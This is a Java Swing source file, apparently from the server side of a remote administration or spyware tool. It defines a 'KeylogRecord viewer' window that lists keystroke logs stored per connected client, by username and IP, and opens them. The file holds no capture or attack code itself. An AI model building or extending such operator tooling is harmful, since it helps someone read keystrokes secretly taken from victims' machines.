/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui.impl;

import com.protocol.packets.beans.Client;
import com.ctx.server.Constants;
import io.netty.channel.ChannelId;
import java.awt.Desktop;
import java.io.File;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class KeylogRecordViewerUI extends javax.swing.JFrame
{
    private javax.swing.JPanel jPanel;
    private javax.swing.JFileChooser keylogRecordFileChooser;
    private final ChannelId channelId;
    
    public KeylogRecordViewerUI(ChannelId channelId) 
    {
        this.channelId = channelId;
        initComponents();
    }
    
    private void initComponents() 
    {
        setTitle("KeylogRecord viewer");
        setResizable(false);
        setAlwaysOnTop(false);
        setIconImage(getToolkit().getImage(getClass().getResource("/icons/7.png")));
        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        
        jPanel = new javax.swing.JPanel();
        keylogRecordFileChooser = new javax.swing.JFileChooser();
        
        Client client = Client.getClients().get(channelId);
        
        final File userDir = new File(Constants.DATA_DIR, client.getUsername() + "_" + client.getIp());
        final File logsDir = new File(userDir, "logs");
        
        if (!logsDir.exists()) 
        {
            JOptionPane.showMessageDialog(rootPane, "No log record found for: " + client.toString());
            dispose();
            return;
        }
        
        keylogRecordFileChooser.setCurrentDirectory(logsDir);
        
        keylogRecordFileChooser.setApproveButtonText("Open");
        
        keylogRecordFileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        keylogRecordFileChooser.setMultiSelectionEnabled(false);

        keylogRecordFileChooser.addActionListener((java.awt.event.ActionEvent evt) -> 
        {
            String actionCommand = evt.getActionCommand();
            System.out.println("Action: " + actionCommand);
            switch (actionCommand) 
            {
                case "ApproveSelection":
                File file = keylogRecordFileChooser.getSelectedFile();
                System.out.println("Selected file: " + file.getAbsolutePath());

                if (Desktop.isDesktopSupported()) 
                {
                try 
                {
                    Desktop.getDesktop().open(file);
                } 
                catch (IOException ex) 
                {
                    Logger.getLogger(KeylogRecordViewerUI.class.getName()).log(Level.SEVERE, null, ex);
                }
                }
                    break;
                
                case "CancelSelection":
                dispose();
                break;
            }
        });
        
  javax.swing.GroupLayout jPanelLayout = new javax.swing.GroupLayout(jPanel);
        jPanel.setLayout(jPanelLayout);
        jPanelLayout.setHorizontalGroup(
            jPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );
        jPanelLayout.setVerticalGroup(
            jPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGap(0, 0, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(keylogRecordFileChooser, javax.swing.GroupLayout.DEFAULT_SIZE, 603, Short.MAX_VALUE))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(keylogRecordFileChooser, javax.swing.GroupLayout.PREFERRED_SIZE, 314, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );

        pack();
        
    }                              
}
